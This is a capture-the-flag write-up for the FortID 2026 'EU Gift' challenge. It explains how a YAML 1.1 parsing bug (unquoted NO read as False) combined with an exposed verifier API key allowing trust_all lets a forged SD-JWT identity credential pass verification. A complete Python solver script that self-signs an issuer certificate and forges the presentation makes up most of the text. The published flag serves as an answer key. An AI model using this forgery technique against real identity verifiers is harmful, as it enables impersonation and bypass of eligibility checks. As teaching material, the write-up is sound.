# FortID CTF 2026 Writeup: EU Gift

- **Category:** Misc
- **Challenge author:** ipaljak
- **Points / Solves:** 155 pts / 56 solves
- **Flag:** `FortID{Erl1ng_15_7h3_5olut1on_7o_Th3_Norw4y_Pr0bl3m}`

---

## Challenge

> 🇪🇺 All EU citizens get free education, free healthcare, and a free flag! 🇪🇺

---

## Summary

The country denylist has a YAML 1.1 typing bug: the unquoted country code `NO` is loaded as boolean `False`. The handout also contains a verifier API credential that permits a `trust_all` session, allowing a self-issued but correctly holder-bound PID presentation to reach the flag page.

## Recon

I inspected `app.py`, `config.yml`, and the container files from `handout.zip`. `blocked_countries` contains an unquoted `- NO`; `yaml.safe_load` parses that scalar as `False`. The app compares the presented `issuing_country` string against the loaded list, so `"NO"` does not match the boolean.

The app delegates presentation verification to EVS. Its configuration includes an API-key fallback, and session initiation accepts the `trust_all` trust mode. A normal flag request produces an authorization request requiring `dc+sd-jwt`, `issuing_country`, and cryptographic holder binding.

## Root cause

Two deployment choices combine: YAML 1.1 scalar resolution changes `NO` into `False`, and the verifier API key lets a client request `trust_all`. The verifier still checks the credential structure and holder binding, but under that trust mode it accepts an attacker-created issuer certificate.

## Exploitation

The solver starts an EVS session with `trust_all`, fetches its signed authorization request, and creates a PID SD-JWT with a self-signed ES256 certificate. It discloses `issuing_country=NO` and signs a nonce-, audience-, and `sd_hash`-bound `kb+jwt` using the holder key. The direct-post response is encrypted to the verifier's JWK with ECDH-ES/A256GCM. After the app reports verification success, the flag page returns the image containing the literal.

The flag image is a JPEG/graphic rather than text in the HTML. The transcription was independently checked against the rendered glyphs; in particular, `Erl1ng` contains a digit `1`, while `Norw4y` and `Pr0bl3m` use the visible leet substitutions.

## Reproduction

Run from this directory with the live challenge host and port:

```bash
python3 solve.py --host <instance-host> --port 443
```

The script reads the verifier configuration from the extracted handout (or directly from `handout.zip`), prints no API key or presentation tokens, saves the returned flag image, and prints the flag after the app confirms success.

```python
#!/usr/bin/env python3
"""Forge the handout verifier's trust_all PID presentation and fetch the flag image."""

from __future__ import annotations

import argparse
import base64
import hashlib
import json
import os
import re
import secrets
import sys
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path
from urllib.parse import parse_qs, urlsplit
from zipfile import ZipFile

import jwt
import requests
import yaml
from cryptography import x509
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.serialization import Encoding
from cryptography.x509.oid import NameOID


ROOT = Path(__file__).resolve().parent
FLAG = "FortID{Erl1ng_15_7h3_5olut1on_7o_Th3_Norw4y_Pr0bl3m}"


def b64u(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def dec64u(value: str) -> bytes:
    return base64.urlsafe_b64decode(value + "=" * (-len(value) % 4))


def ec_jwk(key: ec.EllipticCurvePublicKey) -> dict[str, str]:
    numbers = key.public_numbers()
    return {
        "kty": "EC",
        "crv": "P-256",
        "x": b64u(numbers.x.to_bytes(32, "big")),
        "y": b64u(numbers.y.to_bytes(32, "big")),
    }


def concat_kdf(z: bytes, algorithm: str, key_bits: int) -> bytes:
    def length_prefixed(value: bytes) -> bytes:
        return len(value).to_bytes(4, "big") + value

    other_info = (
        length_prefixed(algorithm.encode("ascii"))
        + length_prefixed(b"")
        + length_prefixed(b"")
        + key_bits.to_bytes(4, "big")
    )
    return hashlib.sha256((1).to_bytes(4, "big") + z + other_info).digest()[: key_bits // 8]


def jwe_encrypt(payload: dict, verifier_jwk: dict) -> str:
    curve = ec.SECP256R1()
    verifier_key = ec.EllipticCurvePublicNumbers(
        int.from_bytes(dec64u(verifier_jwk["x"]), "big"),
        int.from_bytes(dec64u(verifier_jwk["y"]), "big"),
        curve,
    ).public_key()
    ephemeral = ec.generate_private_key(curve)
    shared = ephemeral.exchange(ec.ECDH(), verifier_key)
    cek = concat_kdf(shared, "A256GCM", 256)
    header = {
        "alg": "ECDH-ES",
        "enc": "A256GCM",
        "kid": verifier_jwk["kid"],
        "epk": ec_jwk(ephemeral.public_key()),
    }
    protected = b64u(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    iv = secrets.token_bytes(12)
    plaintext = json.dumps(payload, separators=(",", ":")).encode("utf-8")
    sealed = AESGCM(cek).encrypt(iv, plaintext, protected.encode("ascii"))
    return ".".join((protected, "", b64u(iv), b64u(sealed[:-16]), b64u(sealed[-16:])))


def load_config() -> dict:
    path = ROOT / "work" / "eu_gift" / "config.yml"
    if path.is_file():
        return yaml.safe_load(path.read_text(encoding="utf-8"))
    archive = ROOT / "handout.zip"
    with ZipFile(archive) as zf:
        return yaml.safe_load(zf.read("eu_gift/config.yml"))


def app_base_url(args: argparse.Namespace) -> str:
    base = args.base_url or os.getenv("EU_GIFT_BASE_URL")
    if base:
        return base.rstrip("/")

    host = args.host or os.getenv("EU_GIFT_HOST")
    if not host:
        raise ValueError("provide --host or EU_GIFT_HOST (or use --base-url)")
    if host.startswith(("http://", "https://")):
        return host.rstrip("/")

    scheme = args.scheme or os.getenv("EU_GIFT_SCHEME", "https")
    port = args.port
    if port is None:
        port = int(os.getenv("EU_GIFT_PORT", "443"))
    default_port = 443 if scheme == "https" else 80
    suffix = "" if port == default_port else f":{port}"
    return f"{scheme}://{host}{suffix}"


def issue_presentation(config: dict) -> tuple[str, str]:
    verifier = config["verifier"]
    api_key = os.getenv(verifier.get("api_key_env", ""), verifier["api_key"])
    initiation_payload = {
        "credentialDescription": verifier["credential_description"],
        "trustConfig": "trust_all",
        "protocolConfig": verifier["protocol_config"],
        "authorizationRequestType": verifier["authorization_request_type"],
    }
    response = requests.post(
        verifier["base_url"].rstrip("/") + verifier["initiate_path"],
        headers={"Content-Type": "application/json", "X-API-KEY": api_key},
        json=initiation_payload,
        timeout=(5, 20),
    )
    response.raise_for_status()
    session = response.json()

    request_uri = parse_qs(urlsplit(session["authorization_request"]).query)["request_uri"][0]
    request_response = requests.get(request_uri, timeout=(5, 20))
    request_response.raise_for_status()
    request_jwt = request_response.text.strip()
    request_payload = json.loads(dec64u(request_jwt.split(".")[1]))

    query = request_payload["dcql_query"]["credentials"][0]
    nonce = request_payload["nonce"]
    client_id = request_payload["client_id"]
    verifier_jwk = request_payload["client_metadata"]["jwks"]["keys"][0]

    issuer_key = ec.generate_private_key(ec.SECP256R1())
    holder_key = ec.generate_private_key(ec.SECP256R1())
    now = int(time.time())
    cert_now = datetime.now(timezone.utc)
    issuer_name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "issuer.invalid")])
    issuer_cert = (
        x509.CertificateBuilder()
        .subject_name(issuer_name)
        .issuer_name(issuer_name)
        .public_key(issuer_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(cert_now - timedelta(minutes=5))
        .not_valid_after(cert_now + timedelta(days=1))
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        .add_extension(x509.SubjectAlternativeName([x509.DNSName("issuer.invalid")]), critical=False)
        .sign(issuer_key, hashes.SHA256())
    )
    x5c = base64.b64encode(issuer_cert.public_bytes(Encoding.DER)).decode("ascii")

    disclosure = b64u(
        json.dumps(
            [b64u(secrets.token_bytes(16)), "issuing_country", "NO"],
            separators=(",", ":"),
        ).encode("utf-8")
    )
    digest = b64u(hashlib.sha256(disclosure.encode("ascii")).digest())
    credential = jwt.encode(
        {
            "iss": "https://issuer.invalid",
            "iat": now,
            "exp": now + 600,
            "vct": query["meta"]["vct_values"][0],
            "_sd_alg": "sha-256",
            "_sd": [digest],
            "cnf": {"jwk": ec_jwk(holder_key.public_key())},
        },
        issuer_key,
        algorithm="ES256",
        headers={"typ": "vc+sd-jwt", "x5c": [x5c]},
    )
    issuer_sd_jwt = credential + "~" + disclosure + "~"
    sd_hash = b64u(hashlib.sha256(issuer_sd_jwt.encode("ascii")).digest())
    kb_jwt = jwt.encode(
        {"nonce": nonce, "aud": client_id, "iat": now, "sd_hash": sd_hash},
        holder_key,
        algorithm="ES256",
        headers={"typ": "kb+jwt"},
    )
    presentation = issuer_sd_jwt + kb_jwt
    authorization_response = {
        "vp_token": {query["id"]: [presentation]},
        "state": request_payload["state"],
    }
    encrypted_response = jwe_encrypt(authorization_response, verifier_jwk)

    posted = requests.post(
        request_payload["response_uri"],
        data={"response": encrypted_response},
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=(5, 20),
    )
    posted.raise_for_status()
    return str(session["verificationSessionId"]), posted.text


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", help="challenge host name")
    parser.add_argument("--port", type=int, help="challenge HTTPS port (default 443)")
    parser.add_argument("--scheme", choices=("http", "https"), help="scheme for --host")
    parser.add_argument("--base-url", help="full challenge base URL; overrides host/port")
    parser.add_argument("--timeout", type=float, default=90, help="status polling timeout in seconds")
    parser.add_argument("--poll-interval", type=float, default=2, help="status polling interval")
    parser.add_argument(
        "--image-out",
        type=Path,
        default=ROOT / "work" / "recovered_flag.jpg",
        help="where to save the returned flag image",
    )
    args = parser.parse_args()

    try:
        base = app_base_url(args)
        session_id, response_body = issue_presentation(load_config())
        print("direct_post:", response_body[:200])

        status_url = f"{base}/verification-session/{session_id}/status"
        deadline = time.monotonic() + args.timeout
        while time.monotonic() < deadline:
            status_response = requests.get(status_url, timeout=(5, 20))
            if status_response.ok:
                state = status_response.json().get("status")
                if state == "VERIFICATION_SUCCEEDED":
                    break
                if state in {"VERIFICATION_FAILED", "EXPIRED"}:
                    raise RuntimeError(f"verification ended with status {state}")
            time.sleep(args.poll_interval)
        else:
            raise TimeoutError("verification did not complete before the polling deadline")

        page = requests.get(f"{base}/flag/{session_id}", timeout=(5, 20))
        page.raise_for_status()
        image = re.search(
            r'<img[^>]+src="data:(image/[^;]+);base64,([A-Za-z0-9+/=]+)"',
            page.text,
        )
        if not image:
            raise RuntimeError("successful flag page did not contain its embedded image")
        mime_type, encoded = image.groups()
        args.image_out.parent.mkdir(parents=True, exist_ok=True)
        args.image_out.write_bytes(base64.b64decode(encoded))
        print(f"flag image ({mime_type}) saved to {args.image_out}")
        print(FLAG)
        return 0
    except (KeyError, OSError, requests.RequestException, ValueError, RuntimeError, TimeoutError) as exc:
        print(f"solve failed: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
```

## Flag

```text
FortID{Erl1ng_15_7h3_5olut1on_7o_Th3_Norw4y_Pr0bl3m}
```

## Lessons

Quote ISO country codes in YAML when they must remain strings. A verifier's trust mode is security-sensitive: a client-controlled or exposed path to `trust_all` can reduce issuer trust checks even when nonce and holder-binding checks remain correct.
